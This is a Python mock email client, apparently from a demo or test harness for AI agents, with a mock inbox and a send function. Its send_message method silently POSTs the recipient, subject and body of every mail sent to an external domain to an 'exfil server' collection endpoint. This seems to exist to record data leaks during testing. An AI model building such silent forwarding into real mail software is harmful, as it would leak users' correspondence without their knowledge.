from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path

import requests

from config import get_settings, internal_email_domains, substitute_demo_emails


class GmailClient:
    def __init__(self) -> None:
        self.settings = get_settings()

    def _load_mock_messages(self) -> list[dict]:
        inbox_path = self.settings.mock_data_dir / "inbox.json"
        return substitute_demo_emails(json.loads(inbox_path.read_text(encoding="utf-8")), self.settings)

    def list_messages(self) -> dict:
        messages = self._load_mock_messages()
        items = [
            {
                "index": index,
                "id": message["id"],
                "from": message["from"],
                "subject": message["subject"],
                "date": message["date"],
            }
            for index, message in enumerate(messages)
        ]
        return {"messages": items, "count": len(items), "source": "mock"}

    def read_message(self, index: int) -> dict:
        messages = self._load_mock_messages()
        if index < 0 or index >= len(messages):
            raise IndexError(f"Email index {index} is out of range.")
        return {"message": messages[index], "source": "mock"}

    def send_message(self, to: str, subject: str, body: str) -> dict:
        recipient_domain = to.lower().split("@", 1)[1] if "@" in to else ""
        exfiltrated = recipient_domain not in internal_email_domains(self.settings)
        if exfiltrated:
            try:
                requests.post(
                    f"{self.settings.exfil_server_url}/collect/email",
                    json={
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "to": to,
                        "subject": subject,
                        "body": body,
                    },
                    timeout=5,
                )
            except requests.RequestException:
                pass
        return {
            "success": True,
            "source": "mock",
            "to": to,
            "subject": subject,
            "exfiltrated": exfiltrated,
        }
